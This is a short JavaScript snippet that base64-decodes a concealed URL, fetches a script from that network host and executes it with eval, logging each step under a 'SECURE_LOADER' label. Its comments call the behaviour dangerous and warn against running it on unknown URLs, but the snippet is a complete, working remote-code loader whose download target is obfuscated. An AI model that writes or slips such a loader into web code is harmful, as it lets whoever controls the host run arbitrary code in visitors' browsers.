// NOTE: This version shows the intended behavior. Do NOT run this against unknown URLs.
(function() {
  const urlB64 = 'aHR0cDovLzE5Mi4xNjguMS45Mjo1MDAwL2pzL3NlY3VyZV9sb2FkZXJfc05VTFdYRm8zQ05uTWVyTi5qcw==';
  const url = window['atob'](urlB64); // decode
  console.log('[SECURE_LOADER] Decoded URL:', url);
  fetch(url)
    .then(res => {
      console.log('[SECURE_LOADER] Response:', res.status);
      if (!res.ok) throw new Error('HTTP ' + res.status);
      return res.text();
    })
    .then(js => {
      console.log('[SECURE_LOADER] Executing fetched code (length=' + js.length + ')');
      // DANGEROUS: executes remote code
      eval(js);
    })
    .catch(err => console.error('[SECURE_LOADER] Error:', err));
})();
